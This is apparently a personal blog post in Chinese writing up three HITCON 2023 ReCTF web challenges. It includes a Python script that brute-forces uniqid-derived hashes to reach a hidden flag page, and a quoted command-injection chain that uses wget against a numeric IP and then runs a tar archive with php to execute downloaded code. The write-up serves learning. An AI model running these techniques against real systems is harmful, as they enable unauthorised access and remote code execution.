---
title: HITCON-2023-ReCTF
date: 2023-08-27 20:50:27
tags:
categories:
- [CTF]
cover:
- cover.jpg
---
## 緣起

上周被公司派去參加了 hitcon 2023，看到各路大神、後起之秀的超高水準研究以及那充滿夢想(?)的眼神，
想起自己小時候其中一個夢想就是挖洞拿獎金達到財富自由，工作後慢慢忘記的 hacker 熱情又被點燃了。
由於在台上的講者們都曾是 ctf 王，打 ctf 似乎是一個很好的鍛鍊方式，於是我打算如法炮製，試著打打看，看一年後我會不會搖身一變成挖洞高手，實現夢想👍👍。

在這次 hitcon 2023 我玩了 devcore wargame 和 rectf，{% post_link DEVCORE-Wargame-2023 %} 的部分只解了一題水題...(儘管我仍然花了 5 個小時)，rectf 因為開放時間比較久，費盡洪荒之力總算是解了兩題。在這邊放上 write up 和簡單的心路歷程，記錄一下。

## ReCTF
顧名思義，這個活動是將從前 hitcon ctf 出過的題目進行復刻。

### papapa
{% asset_img papapa-1.png 450 挖勒 %}
一進來頁面就長這樣，啥 input 都沒有，看了 cookie 感覺也沒能控制的點，我無言了...。
通靈了一下子，決定爬文搜 papapa ctf，發現是 hitcon 2016 時 orange 出的題目([連結](https://peterli.website/hitcon-ctf-2016-papapa-%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/))，並翻了 orange github 的出題 src，原來解題的關鍵在憑證...。
{% asset_img papapa-2.png 450 %}

直接 burpsuite 改 host，拿到 flag `FLAG{Nw_u_F0un6_myh05t}`
{% asset_img papapa-3.png 450 %}

但其實這 flag 傳上去是錯的，窩操，傻住了一下，搞不好是藏在其他頁，重新走整個流程再試一次。
{% asset_img papapa-4.png 450 %}
這次真的拿到了 `hitcon{n0w_4y_h4v3_th3_f14g}`，原來 flag 不是在 `/index.html` 是在 `/`，還好不是藏很深(呼氣)。

### yeeclass
{% asset_img yeeclass-1.png 450 %}
這個題目很佛心的給了你整個 source 包括 docker compose，所以只要 trace code 就好，
我原本是這樣想的...，但我前一小時真的看不出洞。
本以為是打 sql injection，但整份 code 都使用 POD execute，應該不是這問題。
後來才發現，submission.php 中有一個判斷失誤，`PERM_TA` 為 1，`_SESSION`不存在時，其在 boolean 的判斷會當成 0 的樣子，可以繞過拿到 FLAG 的清單 (`homework=1`)
{% asset_img yeeclass-2.png 450 %}

於是我把 cookie 清掉再讀一次網頁，繞過了，可惜這邊還是看不到 flag 內容
{% asset_img yeeclass-3.png 450 %}

同時 submission.php 中看到了這一段，我突發奇想: "是不是有辦法 userclass 沒設定但 userid 設定成 `flagholder`"，這樣我就有拿的到 hash 去存取 flag 頁面了？！
``` php
<?php foreach ($result as $row) { ?>
<tr>
    <?php if ((isset($_SESSION["userid"]) && $_SESSION["userclass"] >= PERM_TA) || $row["userid"] == $_SESSION["userid"]) { ?>
    <td><a href="submission.php?hash=<?= $row['hash'] ?>"><?= $row["name"] ?></a></td>
```
於是我轉向 `index.php`，查了一堆資料想了各種可能 (e.g. HPP、race condition)，想破頭了覺得沒辦法做到。
``` php
// 邏輯大概是這樣，一氣呵成，看不出破綻
    $login_query = $pdo->prepare("SELECT * FROM user WHERE username=?");
    $result = $login_query->fetch(PDO::FETCH_ASSOC);
    $_SESSION["userid"] = $result["id"];
    $_SESSION["username"] = $result["username"];
    $_SESSION["userclass"] = $result["class"];
```
最後我破防了，去看出題者的說明，發現要利用 uniuid 直接拿時間戳產生的特性，推出當初用來算 hash 的 uid，學到了...，因為從上一步的繞過，我得到了 flag 的提交時間，可以寫 exploit 了。
exploit 基本上就是參考 php source uniuid 的寫法，其他比較花時間的部分，大概就是想辦法把日期時間轉換成 unixtimestamp 並且 parse 成對應格式，以及一些 POC 的基本驗證了 (我一開始還 parse 錯)
``` python
import http.client
import hashlib
# target url
url = 'rectf.hitcon2023.online'
# The flag submission time
sec = 1692158975
usec = 584096

for  i in range(300,1,-1):
    flag_submit_id = f"flagholder_{sec:x}{usec-i:x}"

    hash = hashlib.sha1(flag_submit_id.encode()).hexdigest()
    print(f"Testing {flag_submit_id}")

    conn = http.client.HTTPConnection(url, 30203)
    # conn = http.client.HTTPConnection(url, 8210)
    conn.request('GET',f'/submission.php?hash={hash}')
    r2 = conn.getresponse()
    data2 = r2.read()
    if(data2 != b'Submission not found.'):
        print(f'Successfully get flag with {hash}')
        print()
        print(data2)
        break
    conn.close()
```
Reference:
- https://stoneapp.tech/cavern/post.php?pid=948

### babyfirst
<script src="https://gist.github.com/orangetw/cb3487e47d7aaaea4692.js"></script>
(應該沒人認真看這篇，我偷偷 host orange 的 gist 應該不會有人發現吧？)

找資料發現 `preg_match` 有個 `\n` 的 mismatch 洞之後，測了一兩個小時，
確定只能這樣串 `$args = ['AAA\n','mycmd','my parameter\n','mycmd']`，沒其他特殊字元可以繞過了。

串指令的路線
1. 寫入 base64 檔案 + decode base64 檔案 + 執行檔案
   - 如何寫入？狗到的方式都是 `echo xxx > file`，有 `>`
   - `base64 -decode` 有 `-`
2. 下載檔案 + 執行檔案
   - 如何下載？首先 ip `xxx.xxx.xxx.xxx` 就有 `.`

感覺都不行，我低下的想像力不知道怎麼辦了。偷偷看了一下 orange 的 writeup，確定 wget 可以。於是我又想了一個小時，靈機一動 ip 有 decimal 形式，`wget 2130706433(127.0.0.1)`成功下載檔案。
但 `wget` 抓下來的檔名是 `index.html`，就算 302 轉向到別的網頁一樣，又再卡住一次。
爬文幾乎每篇講 linux 下載檔案的，都是用 curl、wget。而 curl 也是會用到特殊符號。mv 也要輸入檔案名 `index.html`

在爬了一個多小時的文之後，果斷去看 writeup🥹。
```
mkdir orange
cd orange
wget HEXED_IP
tar cvf payload orange
php payload
```
看了我還是不懂，php 怎麼可能執行 tar 後的檔案，實際試了一次後，還真的可以直接執行😱，為什麼會有這種 feature？！

除此之外還有
- wget 302 重導向到 ftp，可以解決 index.html 預設檔名的問題。
- busybox ftpget
- twistd telnet

這些解法確實是超出我的理解範圍了。

Reference:
- https://kb.hitcon.org/post/131488130087/hitcon-ctf-2015-quals-web-%E5%87%BA%E9%A1%8C%E5%BF%83%E5%BE%97

### 其他題
其他題我還沒打，網站就關了，88。

### 心得

#### papapa
資訊收集的部分要再細心一點，都用 nmap 去掃這網站的 ip 了，卻沒注意到憑證這個部分。
另外意外的收穫就是從 orange 架這題目的 src，學到了 apache 的 virtual host 這個 feature，
原來有這種酷東西，感覺架網站時很有用，並且底層是檢查 http header 中的 `host:` 進行轉送的。
Reference:
- https://github.com/orangetw/My-CTF-Web-Challenges#papapa
- https://blog.51cto.com/milenovo/1698875
- https://httpd.apache.org/docs/2.4/vhosts/name-based.html

#### yeeclass
這一個我感覺就差一點，我因為原本的想法失敗就放棄了，但我認為我是有能力觀察到 uniuid 那邊的貓膩的，
這邊沒有堅持住，搥牆，要改進才行。
在說做不到之前，必須好好確認是不是還有其他可以利用的線索還沒觀察到的。

#### babyfirst
看完 writeup 後，我難得慶幸還好我有看，因為我真的想不出來這幾招...學到了。
還有一個原因可能是我對 linux 的 core util 太不熟了，希望未來會慢慢改善。


